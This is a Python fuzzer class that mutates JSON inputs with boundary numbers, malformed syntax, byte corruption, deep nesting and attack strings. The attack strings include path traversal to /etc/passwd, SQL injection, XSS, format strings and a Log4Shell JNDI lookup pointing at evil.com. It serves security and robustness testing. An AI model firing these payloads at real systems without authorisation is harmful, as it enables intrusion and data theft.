import json
import copy
import random
import struct
from .base_fuzzer import BaseFuzzer


class JsonFuzzer(BaseFuzzer):
    def __init__(self, example_input):
        super().__init__(example_input)
        self._json = self.parsed_data
    
    def parse_input(self, data):
        return json.loads(data.decode('utf-8'))
    
    def mutate_json_structure(self, json_obj):
        mutated = copy.deepcopy(json_obj)
        
        if isinstance(mutated, dict):
            mutation = random.randint(0, 4)
            
            # remove a key
            if mutation == 0 and len(mutated) > 0:
                key = random.choice(list(mutated.keys()))
                del mutated[key]

            # add a random key
            elif mutation == 1:
                mutated[f"fuzz_{random.randint(0, 1000)}"] = "A" * random.randint(1, 100)

            # modify a value
            elif mutation == 2 and len(mutated) > 0:
                key = random.choice(list(mutated.keys()))
                value_type = random.randint(0, 5)
                if value_type == 0:
                    mutated[key] = "A" * random.randint(1, 1000)
                elif value_type == 1:
                    mutated[key] = random.randint(-2147483648, 2147483647)
                elif value_type == 2:
                    mutated[key] = random.choice([True, False, None])
                elif value_type == 3:
                    mutated[key] = []
                elif value_type == 4:
                    mutated[key] = {}
                elif value_type == 5:
                    mutated[key] = "%s" * 10

            # create deeply nested structure
            elif mutation == 3:
                nested = mutated
                for _ in range(random.randint(10, 100)):
                    nested["nested"] = {}
                    nested = nested["nested"]
            
            # duplicate a key (invalid JSON)
            elif mutation == 4 and len(mutated) > 0:
                return mutated
                
        elif isinstance(mutated, list):
            mutation = random.randint(0, 2)

            # add items
            if mutation == 0:
                for _ in range(random.randint(1, 50)):
                    mutated.append("A" * random.randint(1, 100))

            # remove items
            elif mutation == 1 and len(mutated) > 0:
                for _ in range(min(len(mutated), random.randint(1, 5))):
                    mutated.pop(random.randint(0, len(mutated) - 1))

            # modify items
            elif mutation == 2:
                for i in range(len(mutated)):
                    if random.randint(0, 2) == 0:
                        mutated[i] = random.choice([None, True, False, 999999, "FUZZ"])
        
        return mutated
    
    def generate_invalid_json(self):
        invalid_patterns = [
            b'{"key": }',
            b'{"key" "value"}',
            b'{key: "value"}',
            b'{"key": "value",}',
            b'{"key": "value"',
            b'{"key": undefined}',
            b'{"key": NaN}',
            b'{"key": Infinity}',
            b'{"key": \'value\'}',
            b'{"key": "value" "key2": "value2"}',
            b'[1, 2, 3,]',
            b'{"key": 0x123}',
            b'{{{{{',
            b'}}}}}',
            b'{"key": "val\x00ue"}',
            b'{"key": "val\nue"}',
            b'[' * 1000,
            b']' * 1000,
            b'{"' + b'A' * 10000 + b'": "value"}',
            b'/*comment*/{"key":"value"}',
            b'{"key": .123}',
            b'{"key": 01234}',
            b'{"key": "\\uD800"}',
            b'{"key": "\x80\x81\x82"}',
        ]
        return random.choice(invalid_patterns)
    
    def _mutate_numbers(self, json_obj):
        mutated = copy.deepcopy(json_obj)
        
        def mutate_value(val):
            if isinstance(val, int) or isinstance(val, float):
                return random.choice([
                    0, -1, 1,
                    2147483647, -2147483648,
                    4294967295,
                    9223372036854775807, -9223372036854775808,
                    18446744073709551615,
                    999999999999999999999999,
                    -999999999999999999999999,
                    1.7976931348623157e+308,
                    2.2250738585072014e-308,
                    float('inf'), float('-inf'), float('nan'),
                ])
            elif isinstance(val, dict):
                return {k: mutate_value(v) for k, v in val.items()}
            elif isinstance(val, list):
                return [mutate_value(item) for item in val]
            return val
        
        return mutate_value(mutated)
    
    def _mutate_strings(self, json_obj):
        mutated = copy.deepcopy(json_obj)
        
        attack_strings = [
            'A' * 10000,
            '%s%s%s%s%s%s%s%s',
            '%n%n%n%n',
            '\x00' * 100,
            '\x00' + 'A' * 1000,
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            '\'; DROP TABLE users--',
            '<script>alert(1)</script>',
            '${jndi:ldap://evil.com/a}',
            '{{7*7}}',
            '\r\n\r\nHTTP/1.1 200 OK\r\n',
            '\x1b[31mRED\x1b[0m',
            '\uffff' * 100,
            '\u0000' * 100,
        ]
        
        def mutate_value(val):
            if isinstance(val, str):
                return random.choice(attack_strings)
            elif isinstance(val, dict):
                return {k: mutate_value(v) for k, v in val.items()}
            elif isinstance(val, list):
                return [mutate_value(item) for item in val]
            return val
        
        return mutate_value(mutated)
    
    def _mutate_structure(self, json_obj):
        mutated = copy.deepcopy(json_obj)
        mutation_type = random.randint(0, 7)
        
        # create circular reference
        if mutation_type == 0 and isinstance(mutated, dict):
            mutated['__circular__'] = mutated
            return mutated
        
        # extreme nesting
        elif mutation_type == 1:
            nested = mutated
            for _ in range(random.choice([100, 500, 1000])):
                if isinstance(nested, dict):
                    nested['a'] = {}
                    nested = nested['a']
                elif isinstance(nested, list):
                    nested.append([])
                    nested = nested[0]
            return mutated
        
        # massive array
        elif mutation_type == 2:
            if isinstance(mutated, dict):
                mutated['__huge__'] = ['x'] * random.choice([1000, 10000, 100000])
            return mutated
        
        # key collision attacks
        elif mutation_type == 3 and isinstance(mutated, dict):
            for i in range(1000):
                mutated[f'key_{i}'] = i
            return mutated
        
        # type confusion
        elif mutation_type == 4 and isinstance(mutated, dict):
            for key in list(mutated.keys()):
                mutated[key] = random.choice([
                    None, True, False, 0, '', [], {}, 
                    'null', 'true', 'false', '0'
                ])
            return mutated
        
        # empty structures
        elif mutation_type == 5:
            return random.choice([{}, [], None, ''])
        
        # mixed types in array
        elif mutation_type == 6:
            return [
                0, 'string', None, True, False, [], {}, 
                2147483647, -2147483648, float('inf'),
                'A' * 1000, '\x00' * 100
            ]
        
        # nested arrays/objects
        else:
            return {
                'a': [{'b': [{'c': [{'d': 'deep'}]}]}],
                'x': [[[[[[[[['nested']]]]]]]]]
            }
    
    def _mutate_unicode(self, json_obj):
        mutated = copy.deepcopy(json_obj)
        
        unicode_payloads = [
            '\u0000',
            '\uffff',
            '\U0010ffff',
            '\ud800',
            '\udc00',
            '\ufeff',
            '\u202e',
            '\u2028',
            '\u2029',
            'A\u0301\u0301\u0301' * 100,
            '\u0041\u0301',
        ]
        
        def mutate_value(val):
            if isinstance(val, str):
                return random.choice(unicode_payloads)
            elif isinstance(val, dict):
                return {k: mutate_value(v) for k, v in val.items()}
            elif isinstance(val, list):
                return [mutate_value(item) for item in val]
            return val
        
        return mutate_value(mutated)
    
    def _mutate_byte_level(self):
        try:
            data = json.dumps(self.parsed_data).encode('utf-8')
        except:
            data = self.example_input
        
        data = bytearray(data)
        mutation_type = random.randint(0, 7)
        
        # insert null bytes
        if mutation_type == 0:
            pos = random.randint(0, len(data))
            data[pos:pos] = b'\x00' * random.randint(1, 100)
        
        # corrupt UTF-8
        elif mutation_type == 1:
            for _ in range(random.randint(1, 10)):
                if len(data) > 0:
                    pos = random.randint(0, len(data) - 1)
                    data[pos] = random.randint(128, 255)
        
        # bit flips
        elif mutation_type == 2:
            for _ in range(random.randint(1, 20)):
                if len(data) > 0:
                    pos = random.randint(0, len(data) - 1)
                    data[pos] ^= (1 << random.randint(0, 7))
        
        # insert escape sequences
        elif mutation_type == 3:
            escapes = [b'\\n', b'\\r', b'\\t', b'\\\\', b'\\"', b'\\/', b'\\b', b'\\f']
            pos = random.randint(0, len(data))
            data[pos:pos] = random.choice(escapes) * random.randint(1, 50)
        
        # truncate at random position
        elif mutation_type == 4:
            if len(data) > 1:
                data = data[:random.randint(1, len(data))]
        
        # duplicate chunks
        elif mutation_type == 5:
            if len(data) > 10:
                start = random.randint(0, len(data) - 10)
                end = start + random.randint(10, min(100, len(data) - start))
                chunk = data[start:end]
                data.extend(chunk * random.randint(2, 10))
        
        # insert special JSON chars
        elif mutation_type == 6:
            special = [b'{', b'}', b'[', b']', b'"', b':', b',', b'\\']
            pos = random.randint(0, len(data))
            data[pos:pos] = random.choice(special) * random.randint(10, 100)
        
        # invalid escape sequences
        else:
            invalid_escapes = [b'\\x', b'\\u', b'\\uDEAD', b'\\u00', b'\\q', b'\\z']
            pos = random.randint(0, len(data))
            data[pos:pos] = random.choice(invalid_escapes)
        
        return bytes(data)
    
    def _mutate_structured_fields(self, json_obj):
        mutated = copy.deepcopy(json_obj)
        mutation_type = random.randint(0, 9)
        
        # mutate only numeric fields to boundaries
        if mutation_type == 0:
            def mutate_numbers_only(obj):
                if isinstance(obj, (int, float)):
                    return random.choice([
                        0, -1, 1, 2147483647, -2147483648,
                        4294967295, -9223372036854775808,
                        999999999999999999999999,
                    ])
                elif isinstance(obj, dict):
                    return {k: mutate_numbers_only(v) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [mutate_numbers_only(item) for item in obj]
                return obj
            return mutate_numbers_only(mutated)
        
        # mutate only string fields to overflow
        elif mutation_type == 1:
            def mutate_strings_only(obj):
                if isinstance(obj, str):
                    return 'A' * random.choice([100, 1000, 5000, 10000])
                elif isinstance(obj, dict):
                    return {k: mutate_strings_only(v) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [mutate_strings_only(item) for item in obj]
                return obj
            return mutate_strings_only(mutated)
        
        # mutate only string fields to format strings
        elif mutation_type == 2:
            def mutate_to_format_string(obj):
                if isinstance(obj, str):
                    return random.choice(['%s', '%n', '%x', '%p', '%d']) * random.randint(5, 20)
                elif isinstance(obj, dict):
                    return {k: mutate_to_format_string(v) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [mutate_to_format_string(item) for item in obj]
                return obj
            return mutate_to_format_string(mutated)
        
        # keep structure, mutate one random field
        elif mutation_type == 3:
            def mutate_one_field(obj, mutated_yet=[False]):
                if mutated_yet[0]:
                    return obj
                if isinstance(obj, dict) and obj:
                    key = random.choice(list(obj.keys()))
                    if random.random() < 0.3:
                        obj[key] = random.choice([
                            'A' * 10000, -2147483648, 2147483647,
                            '%s%n%x', '\x00' * 100, None
                        ])
                        mutated_yet[0] = True
                    else:
                        obj[key] = mutate_one_field(obj[key], mutated_yet)
                elif isinstance(obj, list) and obj:
                    idx = random.randint(0, len(obj) - 1)
                    if random.random() < 0.3:
                        obj[idx] = random.choice([
                            'A' * 10000, -2147483648, 2147483647,
                            '%s%n%x', '\x00' * 100, None
                        ])
                        mutated_yet[0] = True
                    else:
                        obj[idx] = mutate_one_field(obj[idx], mutated_yet)
                return obj
            return mutate_one_field(mutated)
        
        # add one malicious field, keep rest
        elif mutation_type == 4:
            if isinstance(mutated, dict):
                mutated['__evil__'] = random.choice([
                    'A' * 10000, -2147483648, '\x00' * 1000,
                    '%s%n%x%p%d' * 10, '../../../etc/passwd'
                ])
            return mutated
        
        # mutate array elements to same type boundary
        elif mutation_type == 5:
            if isinstance(mutated, list) and mutated:
                if isinstance(mutated[0], (int, float)):
                    return [random.choice([0, -1, 2147483647, -2147483648])] * len(mutated)
                elif isinstance(mutated[0], str):
                    return ['A' * 1000] * len(mutated)
            return mutated
        
        # preserve keys, mutate all values to same attack
        elif mutation_type == 6:
            if isinstance(mutated, dict):
                attack = random.choice([
                    'A' * 5000, -2147483648, '%s%n%x', '\x00' * 100,
                    '../../../etc/passwd', '${jndi:ldap://evil.com/a}'
                ])
                return {k: attack for k in mutated.keys()}
            return mutated
        
        # mutate nested objects, preserve top level
        elif mutation_type == 7:
            def mutate_nested_only(obj, depth=0):
                if depth > 0:
                    if isinstance(obj, (int, float)):
                        return random.choice([0, -1, 2147483647, -2147483648])
                    elif isinstance(obj, str):
                        return 'A' * 1000
                if isinstance(obj, dict):
                    return {k: mutate_nested_only(v, depth + 1) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [mutate_nested_only(item, depth + 1) for item in obj]
                return obj
            return mutate_nested_only(mutated)
        
        # add boundary value array
        elif mutation_type == 8:
            if isinstance(mutated, dict):
                mutated['__boundaries__'] = [
                    0, -1, 1, 2147483647, -2147483648,
                    4294967295, -9223372036854775808
                ]
            return mutated
        
        # convert all booleans/nulls to numbers
        else:
            def convert_special(obj):
                if obj is None:
                    return 0
                elif obj is True:
                    return 1
                elif obj is False:
                    return 0
                elif isinstance(obj, dict):
                    return {k: convert_special(v) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [convert_special(item) for item in obj]
                return obj
            return convert_special(mutated)
    
    def generate(self):
        # basic edge cases
        yield b""
        yield b"{}"
        yield b"[]"
        yield b"null"
        yield b"true"
        yield b"false"
        yield b"0"
        yield b'""'

        if self.parsed_data:
            for _ in range(50):
                try:
                    mutated = self._mutate_structured_fields(self.parsed_data)
                    yield json.dumps(mutated).encode('utf-8')
                except:
                    yield self.mutate_bytes(self.example_input)
            
            for _ in range(15):
                try:
                    mutated = self._mutate_numbers(self.parsed_data)
                    yield json.dumps(mutated).encode('utf-8')
                except:
                    yield self.mutate_bytes(self.example_input)
            
            for _ in range(15):
                try:
                    mutated = self._mutate_strings(self.parsed_data)
                    yield json.dumps(mutated).encode('utf-8')
                except:
                    yield self.mutate_bytes(self.example_input)
            
            for _ in range(15):
                yield self.generate_invalid_json()

            for _ in range(15):
                yield self._mutate_byte_level()

            for _ in range(10):
                try:
                    mutated = self._mutate_unicode(self.parsed_data)
                    yield json.dumps(mutated).encode('utf-8')
                except:
                    yield self.mutate_bytes(self.example_input)

            for _ in range(15):
                try:
                    mutated = self._mutate_structure(self.parsed_data)
                    yield json.dumps(mutated).encode('utf-8')
                except (TypeError, ValueError, RecursionError):
                    yield self.mutate_bytes(self.example_input)
            
            for _ in range(10):
                try:
                    mutated = self.mutate_json_structure(self.parsed_data)
                    yield json.dumps(mutated).encode('utf-8')
                except:
                    yield self.mutate_bytes(self.example_input)

            if isinstance(self.parsed_data, dict):
                try:
                    json_str = json.dumps(self.parsed_data)
                    if '"' in json_str:
                        first_key_start = json_str.find('"')
                        first_key_end = json_str.find('"', first_key_start + 1)
                        if first_key_end != -1:
                            key = json_str[first_key_start:first_key_end+1]
                            insertion_point = json_str.rfind('}')
                            if insertion_point != -1:
                                duplicated = json_str[:insertion_point] + ', ' + key + ': "duplicate_value"}' + json_str[insertion_point+1:]
                                yield duplicated.encode('utf-8')
                except:
                    pass

            for _ in range(30):
                try:
                    mutated = copy.deepcopy(self.parsed_data)
                    mutated = self._mutate_structured_fields(mutated)
                    mutation_func = random.choice([
                        self._mutate_numbers,
                        self._mutate_strings,
                        self._mutate_unicode,
                    ])
                    mutated = mutation_func(mutated)
                    yield json.dumps(mutated).encode('utf-8')
                except:
                    yield self.mutate_bytes(self.example_input)

            for _ in range(20):
                try:
                    mutated = copy.deepcopy(self.parsed_data)
                    for _ in range(random.randint(2, 3)):
                        mutation_func = random.choice([
                            self._mutate_structured_fields,
                            self._mutate_numbers,
                            self._mutate_strings,
                            self._mutate_unicode,
                        ])
                        mutated = mutation_func(mutated)
                    yield json.dumps(mutated).encode('utf-8')
                except:
                    yield self.mutate_bytes(self.example_input)

            for _ in range(30):
                try:
                    mutated = copy.deepcopy(self.parsed_data)
                    for _ in range(random.randint(3, 5)):
                        mutation_func = random.choice([
                            self._mutate_structured_fields,
                            self._mutate_numbers,
                            self._mutate_strings,
                            self._mutate_unicode,
                            self._mutate_structure,
                            self.mutate_json_structure,
                        ])
                        mutated = mutation_func(mutated)
                    
                    serialized = json.dumps(mutated).encode('utf-8')
                    if random.random() < 0.5:
                        serialized = bytearray(serialized)
                        for _ in range(random.randint(1, 3)):
                            if len(serialized) > 0:
                                pos = random.randint(0, len(serialized) - 1)
                                serialized[pos] = random.randint(0, 255)
                        serialized = bytes(serialized)
                    yield serialized
                except:
                    yield self.mutate_bytes(self.example_input)

            while True:
                try:
                    mutated = random.choice([
                        self._mutate_structured_fields,
                        self._mutate_numbers,
                        self._mutate_strings,
                        self._mutate_unicode,
                        self._mutate_structure,
                        self.mutate_json_structure,
                    ])(self.parsed_data)
                    yield json.dumps(mutated).encode('utf-8')
                except:
                    yield self.mutate_bytes(self.example_input)
        else:
            # fallback for unparseable JSON
            while True:
                yield self.mutate_bytes(self.example_input)
